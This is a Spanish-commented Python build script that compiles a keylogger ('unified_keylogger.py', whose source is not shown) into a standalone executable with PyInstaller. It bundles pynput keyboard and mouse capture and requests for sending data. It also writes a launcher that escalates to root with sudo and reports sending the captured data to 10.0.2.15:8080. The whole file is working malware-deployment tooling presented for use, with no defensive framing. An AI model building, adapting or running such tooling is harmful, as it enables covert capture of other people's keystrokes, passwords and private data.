#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import shutil

def install_pyinstaller():
    """instala pyinstaller si no esta disponible, maneja entornos gestionados"""
    import importlib.util
    if importlib.util.find_spec("pyinstaller") is not None:
        print("pyinstaller ya esta instalado")
        return True
    
    print("instalando pyinstaller...")
    
    # metodo 1: intentar con apt (debian/ubuntu/parrot)
    if shutil.which("apt"):
        print("detectado sistema debian/ubuntu, intentando con apt...")
        try:
            subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True)
            subprocess.run(["sudo", "apt", "install", "-y", "python3-pyinstaller"], check=True)
            print("pyinstaller instalado via apt")
            return True
        except subprocess.CalledProcessError:
            print("apt fallo, intentando con pip...")
    
    # metodo 2: pip con --break-system-packages (entornos gestionados)
    try:
        subprocess.run([
            sys.executable, "-m", "pip", "install", 
            "--break-system-packages", "pyinstaller"
        ], check=True)
        print("pyinstaller instalado con --break-system-packages")
        return True
    except subprocess.CalledProcessError:
        print("pip con --break-system-packages fallo, intentando pip normal...")
    
    # metodo 3: pip normal
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
        print("pyinstaller instalado con pip normal")
        return True
    except subprocess.CalledProcessError:
        print("pip normal fallo, intentando con entorno virtual temporal...")
    
    # metodo 4: entorno virtual temporal
    try:
        venv_path = "temp_venv"
        subprocess.run([sys.executable, "-m", "venv", venv_path], check=True)
        
        # activar entorno virtual y instalar
        if os.name == 'nt':  # windows
            pip_path = os.path.join(venv_path, "Scripts", "pip")
            python_path = os.path.join(venv_path, "Scripts", "python")
        else:  # unix/linux
            pip_path = os.path.join(venv_path, "bin", "pip")
            python_path = os.path.join(venv_path, "bin", "python")
        
        subprocess.run([pip_path, "install", "pyinstaller"], check=True)
        
        # actualizar sys.executable para usar el del entorno virtual
        sys.executable = python_path
        
        print("pyinstaller instalado en entorno virtual temporal")
        return True
    except subprocess.CalledProcessError:
        print("error: no se pudo instalar pyinstaller con ningun metodo")
        return False

def build_executable():
    """compila el keylogger a ejecutable"""
    print("compilando keylogger...")
    
    # limpiar compilaciones anteriores
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists("keylogger.spec"):
        os.remove("keylogger.spec")
    
    # comando de compilacion
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--console",
        "--name=keylogger",
        "--add-data=reconstructor.py:.",
        "--hidden-import=pynput",
        "--hidden-import=pynput.keyboard",
        "--hidden-import=pynput.mouse", 
        "--hidden-import=requests",
        "--hidden-import=urllib3",
        "--clean",
        "unified_keylogger.py"
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print("\n" + "="*50)
        print("ejecutable creado exitosamente")
        print("="*50)
        print("ubicacion: dist/keylogger")
        print("uso: sudo ./dist/keylogger")
        print("tamaño:", get_file_size("dist/keylogger"))
        print("="*50)
        return True
    except subprocess.CalledProcessError as e:
        print(f"error compilando: {e}")
        return False

def get_file_size(filepath):
    """obtiene el tamaño del archivo"""
    try:
        size = os.path.getsize(filepath)
        if size < 1024:
            return f"{size} bytes"
        elif size < 1024*1024:
            return f"{size/1024:.1f} KB"
        else:
            return f"{size/(1024*1024):.1f} MB"
    except:
        return "desconocido"

def create_launcher():
    """crea script de lanzamiento opcional"""
    launcher_content = """#!/bin/bash
# lanzador automatico del keylogger

echo "keylogger compilado"
echo "=================="

# verificar si el ejecutable existe
if [ ! -f "dist/keylogger" ]; then
    echo "error: ejecutable no encontrado"
    echo "ejecuta primero: python build_keylogger.py"
    exit 1
fi

# verificar permisos de root
if [ "$EUID" -ne 0 ]; then
    echo "necesitas permisos de administrador"
    echo "relanzando con sudo..."
    exec sudo "$0" "$@"
fi

echo "iniciando keylogger..."
echo "configurado para enviar a: 10.0.2.15:8080"
echo "presiona ctrl+c para detener"
echo ""

# ejecutar keylogger
./dist/keylogger

echo ""
echo "keylogger detenido"
read -p "presiona enter para salir..."
"""
    
    with open("run_keylogger.sh", "w") as f:
        f.write(launcher_content)
    
    os.chmod("run_keylogger.sh", 0o755)
    print("script de lanzamiento creado: run_keylogger.sh")

def main():
    print("compilador de keylogger")
    print("======================")
    print("")
    
    # verificar archivos necesarios
    required_files = ["unified_keylogger.py", "reconstructor.py"]
    for file in required_files:
        if not os.path.exists(file):
            print(f"error: {file} no encontrado")
            return
    
    # instalar pyinstaller
    if not install_pyinstaller():
        print("error: no se pudo instalar pyinstaller")
        print("instalacion manual requerida:")
        print("sudo apt install python3-pyinstaller")
        print("o pip install --break-system-packages pyinstaller")
        return
    
    # compilar ejecutable
    if build_executable():
        create_launcher()
        print("\ncompilacion completada exitosamente")
        print("opciones de ejecucion:")
        print("1. sudo ./dist/keylogger")
        print("2. sudo ./run_keylogger.sh")
    else:
        print("error en la compilacion")

if __name__ == "__main__":
    main()
